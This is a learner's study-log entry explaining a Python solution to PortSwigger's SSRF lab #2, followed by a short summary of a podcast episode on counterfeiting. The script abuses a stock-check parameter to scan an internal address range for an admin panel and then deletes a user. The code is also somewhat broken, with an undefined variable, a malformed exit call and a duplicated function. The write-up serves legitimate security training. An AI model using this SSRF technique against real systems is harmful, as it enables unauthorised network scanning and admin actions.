"The mind is everything. What you think you become." - Buddha

# Day-15 Summary:

### Things Done Today:

- Was supposed to complete the Pivoting sub-topic in Wreath Network, but understanding python code for SSRF lab #2 consumed most of my day, so instead of that, I listend to Darknet Diaries Ep 102. 

- [X] **SSRF Lab #2:** [Web-Security Academy](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system) -- PortSwigger; [Rana Khalil's Course](https://ranakhalil.teachable.com/);
  - Done with lab#2 today: It was pretty easy and understanding to the python code was a bit difficult, I mean it took time [Check out the full code in good format here], which I'm gonna tryna explain you people here below.
  - Goal of the lab: use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

1. Importing all the modules. Also disabling the warnings incase of not having the valid certificate.

```
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```
2. Now first we have to define the main method, here we have to write what we want to execute for the whole program. So here, if user input is not equal to 2, if will exit the program otherwise will continue with the same. Next we are asking for users to input the <url> and saving that <url> in the "url" variable [confused? lol], then in order to find the correct admin ip address, we make a variable for the same and assign "check_admin_hostname(url)" [Now got to the point 3, read that and come back] So now that you understood what we did there, next up, once we got the admin correct address, we gotta delete the user carlos, right? [Now check point 4, where we defined the same]. Yea, That's what we did here in this piece of code.

```
if __name__ == "__main__":
    main()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example: %s Th3lazykid.gitbook.io" % sys.argv[0])
        sys.exit[-1]

    url = sys.argv[1]
    print("(+) Findin admin hostname")
    admin_ip_address = check_admin_hostname(url)
    print("(+) Found the admin ip address: %s" % admin_ip_address)
    print("(+) Deleting Carlos user...")
    delete_user(url, admin_ip_address)
```

3. Here we are defining the "check_admin_hostname(url)", where we basically gotta scan the whole internal network and find the correct address of admin. So at first we provide the stock path, next we make a variable name "admin_hostname" with empty string. With the help of `for loop` we are scanning this whole thing, and while scanning the network if the status code == 200, that means we got the address and the for loop will break, Next setting up another for loop, for like what if we don't find any of the ip address correct? this will print out: `(-) Could not find admin hostname.`.

```
def check_admin_hostname(url):
    check_stock_path = "/product/stock"
    admin_hostname = ''
    for i in range(1, 256):
        hostname = "http://192.168.0.%s:8080/admin" %i
        params = {'stockApi': hostname}
        r = requests.post(url + check_stock_path, data=params, proxies=proxies, verify=False)
        if r.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i
            break
    if admin_ip_address == '':
        print("(-) Could not find admin hostname.")
    return admin_ip_address
```

4. Here we are defining the `delete_user(url, admin_ip_address)`, so after getting the correct admin Ip, it's time to check out the source code and get the path to delete any user, and then delete the user name carlos. So at first here we are adding the payloads and the path and making the request to the url to delete the user name carlos. Next after deleting, we gotta check if the user carlos is actually got deleted or not, right? So in the next code, we are using the payload of the admin path, cause after deletion of any user it redirects to the admin path and says the message that `User deleted successfully`. Again making the request with the payload and the params, and checking the response for the keyword `User deleted successfully`, if it is there, that means we are successful with the program but if not it outputs as that exploit was unsuccessful. I'M SO FUCKING BAD AT EXPLAINING THINGS. HOPE I IMPROVE WHILE DOING THIS. THANK YOU FOR STICKING WITH ME UNTIL NOW. [GOD BLESS YOU XD]

```
def delete_user(url, admin_ip_address):
    check_stock_path = "/product/stock"
    payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
    params = {'stockApi': payload}
    r = requests.post(url + check_stock_path, data=params, proxies=proxies, verify=False)
    
    #Now checking if the user carlos actually got deleted.
    payload2 =  'http://%s:8080/admin/' % admin_ip_address
    params2 = {'stockApi': payload2}
    r = requests.post(url + check_stock_path, data=params2, proxies=proxies, verify=False)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) !=2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example: %s Th3lazykid.gitbook.io" % sys.argv[0])
```
- [X] **Darknet Diaries:**

  - [EP 102: Money Maker](https://darknetdiaries.com/episode/102/): Such a amazing story of Frank Bourassa, how he started re-selling stolen clothes to making $250 million fake money - $20 US bills. Counterfeiting money is really complex process, getting paper, ink, printers, etc. Loved how he made up the story and got the papers needed to make the fake money, which is to be considered the hardest part in the whole process. Listen to the podcast to know how he got caught and how his lawyer used "Big Brains", that saved him from getting 60 years around of prision but instead just $1500 fine. 

<img width="986" alt="Screenshot 2021-10-13 at 9 04 46 AM" src="https://user-images.githubusercontent.com/56188454/137075127-22b93151-a6c7-41f3-b27e-e87093eb7055.png">
<img width="993" alt="Screenshot 2021-10-13 at 9 13 14 AM" src="https://user-images.githubusercontent.com/56188454/137075137-f254f903-6921-4d46-8e7b-d92cbf00dbfe.png">
